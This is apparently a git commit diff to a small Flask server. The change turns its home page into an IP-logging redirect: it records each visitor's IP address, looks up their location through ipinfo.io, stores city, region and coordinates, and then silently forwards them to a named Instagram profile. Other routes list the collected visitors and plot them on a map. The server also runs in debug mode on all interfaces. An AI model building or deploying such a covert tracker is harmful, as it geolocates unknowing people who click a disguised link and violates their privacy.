f22655a912c0e71e6d4c17c567b42225c22cfff2
maicon.ferreira <maicon.ferreira@vmis.com.br>
2025-04-25 07:47:43 -0300

    update scripts

--- servidor.py
+++ servidor.py
@@ -1,33 +1,40 @@
-from flask import Flask, request, jsonify, render_template
+from flask import Flask, request, redirect, jsonify, render_template
 import requests
 
 app = Flask(__name__)
 acessos = []
 
 @app.route('/')
-def home():
-    return render_template("mapa.html")
-
-@app.route('/registrar', methods=['POST'])
-def registrar():
-    data = request.json
+def redirecionar():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
 
-    acesso = {
-        'ip': ip,
-        'lat': data.get('lat', 0),
-        'lon': data.get('lon', 0),
-        'city': data.get('city', 'Desconhecida'),
-        'region': data.get('region', 'Desconhecida'),
-        'country': data.get('country', 'Desconhecido'),
-    }
+    try:
+        geo_info = requests.get(f'https://ipinfo.io/{ip}/json').json()
+        loc = geo_info.get('loc', '')
+        lat, lon = map(float, loc.split(',')) if loc else (0.0, 0.0)
+    except:
+        lat, lon = 0.0, 0.0
+        geo_info = {}
 
-    acessos.append(acesso)
-    return jsonify({"status": "ok"}), 200
+    # Armazenar dados
+    acessos.append({
+        'ip': ip,
+        'lat': lat,
+        'lon': lon,
+        'city': geo_info.get('city', 'Desconhecida'),
+        'region': geo_info.get('region', 'Desconhecida'),
+        'country': geo_info.get('country', 'Desconhecido')
+    })
+
+    return redirect("https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0", code=302)
 
 @app.route('/acessos')
-def listar_acessos():
-    return jsonify(acessos)
+def mostrar_acessos():
+    return render_template("acessos.html", acessos=acessos)
+
+@app.route('/mapa')
+def exibir_mapa():
+    return render_template("mapa.html", acessos=acessos)
 
 if __name__ == '__main__':
-    app.run(debug=True, host="0.0.0.0", port=5002)
+    app.run(debug=True, host='0.0.0.0', port=5002)
